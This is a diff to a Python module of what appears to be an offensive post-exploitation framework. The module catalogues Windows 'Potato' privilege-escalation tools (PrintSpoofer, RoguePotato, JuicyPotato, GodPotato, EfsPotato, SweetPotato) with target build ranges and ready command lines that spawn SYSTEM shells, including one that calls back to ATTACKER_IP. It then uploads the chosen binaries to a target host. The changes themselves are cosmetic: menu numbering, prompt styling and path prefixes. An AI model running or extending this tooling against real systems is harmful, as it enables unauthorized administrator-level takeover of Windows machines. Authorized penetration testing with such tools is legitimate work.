@@ -1,5 +1,5 @@
 from core.paths import get_tools_dir
-from modules.upload.windows import stage_windows_files
+from modules.upload.windows import stage_windows_files, DEFAULT_REMOTE_DIR
 
 
 G, C, B, Y, W, R = (
@@ -25,7 +25,7 @@ POTATOES = {
         "build_min": 17763,
         "build_max": None,
         "method": "named pipe impersonation",
-        "run": "PrintSpoofer.exe -i -c cmd",
+        "run": ".\\PrintSpoofer.exe -i -c cmd",
         "binaries": ["PrintSpoofer.exe", "PrintSpoofer64.exe"],
         "notes": [
             "works well on Server 2019",
@@ -38,7 +38,7 @@ POTATOES = {
         "build_min": 17763,
         "build_max": None,
         "method": "OXID resolver spoofing",
-        "run": 'RoguePotato.exe -r ATTACKER_IP -e "cmd.exe"',
+        "run": '.\\RoguePotato.exe -r ATTACKER_IP -e "cmd.exe"',
         "binaries": ["RoguePotato.exe"],
         "notes": [
             "may require a socat redirector",
@@ -51,7 +51,7 @@ POTATOES = {
         "build_min": 7600,
         "build_max": 17134,
         "method": "CLSID / DCOM abuse",
-        "run": "JuicyPotato.exe -t * -p cmd.exe -a \"/c cmd.exe\" -l 53375",
+        "run": ".\\JuicyPotato.exe -t * -p cmd.exe -a \"/c cmd.exe\" -l 53375",
         "binaries": ["JuicyPotato.exe"],
         "notes": [
             "broken from Windows 10 1809 / Server 2019 onward",
@@ -77,7 +77,7 @@ POTATOES = {
         "build_min": 9600,
         "build_max": None,
         "method": "RPC/DCOM impersonation with no fixed CLSID or OXID resolver dependency",
-        "run": 'GodPotato.exe -cmd "cmd /c whoami"',
+        "run": '.\\GodPotato.exe -cmd "cmd /c whoami"',
         "binaries": ["GodPotato.exe"],
         "notes": [
             "reported to work from Server 2012 through Server 2022 / Win11",
@@ -90,7 +90,7 @@ POTATOES = {
         "build_min": 7600,
         "build_max": None,
         "method": "MS-EFSR named pipe impersonation (PetitPotam-style)",
-        "run": 'EfsPotato.exe "cmd /c whoami"',
+        "run": '.\\EfsPotato.exe "cmd /c whoami"',
         "binaries": ["EfsPotato.exe", "SharpEfsPotato.exe"],
         "notes": [
             "alternative when PrintSpoofer's spoolss pipe is unavailable (e.g. Print Spooler disabled)",
@@ -103,7 +103,7 @@ POTATOES = {
         "build_min": 7600,
         "build_max": None,
         "method": "bundles multiple impersonation techniques (Rotten/Juicy/Efs/PrintSpoofer-style) into one binary",
-        "run": 'SweetPotato.exe -a "whoami"',
+        "run": '.\\SweetPotato.exe -a "whoami"',
         "binaries": ["SweetPotato.exe"],
         "notes": [
             "auto-selects a working technique for the target build",
@@ -156,7 +156,7 @@ def run(data, cred, args):
     if build is None:
 
         raw = input(
-            f"\n{Y}Target OS build number (blank to see all options): {W}"
+            f"\n{B}[?]{W} Target OS build number (blank to see all options): "
         ).strip()
 
         if raw.isdigit():
@@ -188,12 +188,12 @@ def run(data, cred, args):
     print(f"{C}Potato Options{f' (build {build})' if build else ''}{W}")
     print("-" * 40)
 
-    for i, name in enumerate(names):
+    for i, name in enumerate(names, start=1):
 
         entry = candidates[name]
         lo, hi = _build_range(entry)
 
-        print(f"{B}[{i}]{W} {C}{name:<14}{W} requires: {', '.join(entry['requires'])}  builds: {lo}-{hi}")
+        print(f"{C}[{i}]{W} {C}{name:<14}{W} requires: {', '.join(entry['requires'])}  builds: {lo}-{hi}")
         print(f"{'':<18} {'; '.join(entry['notes'])}")
 
     #
@@ -203,9 +203,9 @@ def run(data, cred, args):
         index = 0
     else:
 
-        raw = input(f"\n{Y}Pick a variant [0-{len(names) - 1}]: {W}").strip()
+        raw = input(f"\n{B}[?]{W} Pick a variant [1-{len(names)}]: ").strip()
 
-        index = int(raw) if raw.isdigit() else -1
+        index = int(raw) - 1 if raw.isdigit() else -1
 
     if index < 0 or index >= len(names):
         print(f"{R}[-] No variant selected.{W}")
@@ -248,15 +248,15 @@ def run(data, cred, args):
         print()
         print("Found binaries:")
 
-        for i, path in enumerate(binaries):
-            print(f"  [{i}] {path}")
+        for i, path in enumerate(binaries, start=1):
+            print(f"  {C}[{i}]{W} {path}")
 
-        raw = input(f"{Y}Transfer which? [index, 'all', or blank to skip]: {W}").strip()
+        raw = input(f"{B}[?]{W} Transfer which? [1-{len(binaries)}, 'all', or blank to skip]: ").strip()
 
         if raw.lower() == "all":
             targets = binaries
-        elif raw.isdigit() and int(raw) < len(binaries):
-            targets = [binaries[int(raw)]]
+        elif raw.isdigit() and 1 <= int(raw) <= len(binaries):
+            targets = [binaries[int(raw) - 1]]
         else:
             targets = []
 
@@ -264,8 +264,10 @@ def run(data, cred, args):
         return
 
     choice = input(
-        f"\n{Y}Transfer {', '.join(p.name for p in targets)} to target? [Y/n]: {W}"
+        f"\n{B}[?]{W} Transfer {', '.join(p.name for p in targets)} to target? [Y/n]: "
     ).strip().lower()
 
     if choice in ("", "y", "yes"):
         stage_windows_files(targets)
+        print()
+        print(f"    {B}[*]{W} Staged to {DEFAULT_REMOTE_DIR} — cd there before running the command above.")
